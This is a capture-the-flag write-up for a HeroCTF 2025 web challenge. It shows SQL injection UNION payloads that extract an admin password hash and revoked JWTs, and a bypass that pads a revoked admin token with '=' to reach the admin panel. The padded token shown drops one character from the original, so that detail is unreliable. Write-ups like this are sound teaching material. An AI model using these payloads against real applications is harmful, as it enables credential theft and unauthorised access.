web

**1. Initial Analysis**

The challenge provided a URL to a web application and the `main.py` source code. Initial review of `main.py` revealed:
- The application is built with Flask.
- It uses SQLite for its database, with tables `users`, `revoked_tokens`, and `employees`.
- Authentication is handled via JWTs, stored in cookies.
- A `token_required` decorator checks for valid and non-revoked JWTs.
- The `/admin` endpoint is protected and serves the flag if the user has `is_admin: 1` in their JWT.
- The `SECRET_KEY` for JWT signing is randomly generated at each startup, preventing direct JWT forging.

**2. Vulnerability Discovery: SQL Injection in /employees**

The `/employees` endpoint was identified as vulnerable to SQL Injection:

```python
@app.route("/employees", methods=["GET"])
@token_required
def employees():
    query = request.args.get("query", "")
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute(
        f"SELECT id, name, email, position FROM employees WHERE name LIKE '%{query}%'"
    )
    # ... rest of the code
```

The `query` parameter is directly interpolated into the SQL query without proper sanitization, allowing for arbitrary SQL to be executed.

**3. Exploiting SQL Injection - Dumping Admin Credentials**

To proceed, a regular user was registered and logged in to obtain a valid JWT to access the `/employees` endpoint.

- Registered user: `testuser:testpassword`
- Logged in to obtain JWT.

An `UNION SELECT` attack was crafted to extract information from the `users` table. The `employees` query selects 4 columns (`id, name, email, position`). The `users` table contains `id, username, is_admin, password_hash`.

Initial payload attempt: `a'+AND+1=0+UNION+SELECT+id,username,password_hash,is_admin+FROM+users+WHERE+is_admin=1--`
This payload aimed to make the original `employees` query return no results (`AND 1=0`) and then union it with a select statement from the `users` table, specifically looking for users where `is_admin` is `1`.

The output from the server showed:
- `<h5 class="card-title fw-bold text-dark mb-2">admin</h5>`
- `<p class="card-text text-muted mb-3">1</p>`

This indicated that `username` ("admin") was mapped to the `name` field, and `is_admin` ("1") was mapped to the `position` field. However, the `password_hash` (which was mapped to the `email` field) was not displayed in the HTML output.

To retrieve the password hash, the `UNION SELECT` was modified to display the `password_hash` in the `name` field and the `username` in the `position` field:

Payload: `a'+AND+1=0+UNION+SELECT+id,password_hash,NULL,username+FROM+users+WHERE+is_admin=1--`

This returned:
- `<h5 class="card-title fw-bold text-dark mb-2">$2b$12$bxz42WrC.uUZVc38WiLSYeIlVB84xd5Ta2uBZW8S8wSwW1iGlAuhG</h5>`
- `<p class="card-text text-muted mb-3">admin</p>`

Extracted admin credentials:
- **Username:** `admin`
- **Password Hash:** `$2b$12$bxz42WrC.uUZVc38WiLSYeIlVB84xd5Ta2uBZW8S8wSwW1iGlAuhG`

**4. Vulnerability Discovery: JWT Revocation Bypass**

Since the JWT `SECRET_KEY` is dynamic, direct forging of an admin token was not feasible. However, the `token_required` function's revocation check was identified as a potential bypass vector, similar to a previous challenge:

```python
            revoked = conn.execute(
                "SELECT id FROM revoked_tokens WHERE token = ?", (token,)
            ).fetchone()
            # ...
            if not user or revoked:
                flash("Invalid or revoked token!", "error")
                return redirect("/login")
```

This code performs a strict string equality check when looking up a token in the `revoked_tokens` table. If a token that is syntactically valid but has extra padding (e.g., `=` characters) is passed, the `PyJWT` library might still decode it, but the SQLite `WHERE token = ?` clause with strict equality would fail to match it against a stored, unpadded token.

**5. Exploiting JWT Revocation Bypass - Obtaining Admin Access**

The next step was to dump existing revoked tokens to find an admin token.

Payload: `a'+AND+1=0+UNION+SELECT+id,token,NULL,NULL+FROM+revoked_tokens--`

This successfully returned several revoked tokens, including one for the `admin` user:
`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNfYWRtaW4iOjEsImlzc3VlZCI6MTc2NDQyODU3OS4zMTE2OTl9.QY6letwO9U3kUpDaM4sGBa3NpJrBwbBMYcnnFoSJ91E`

This revoked admin token was then used to access the `/admin` endpoint after appending a padding character (`=`).

Padded Token: `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNfYWRtaW4iOjEsImlzc3VlZCI6MTc2NDQyODU3OS4zMTE2OTl9.QY6letwO9U3kUpDaM4sGB3NpJrBwbBMYcnnFoSJ91E=`

By making a request to `/admin` with this padded token as the `JWT` cookie, the application granted access to the admin panel.

**6. Flag**

The `/admin` panel displayed the flag:
`Hero{N0t_th4t_r3v0k3d_37d75e49a6578b66652eca1cfe080e5b}`

[[HeroCTF 2025]]

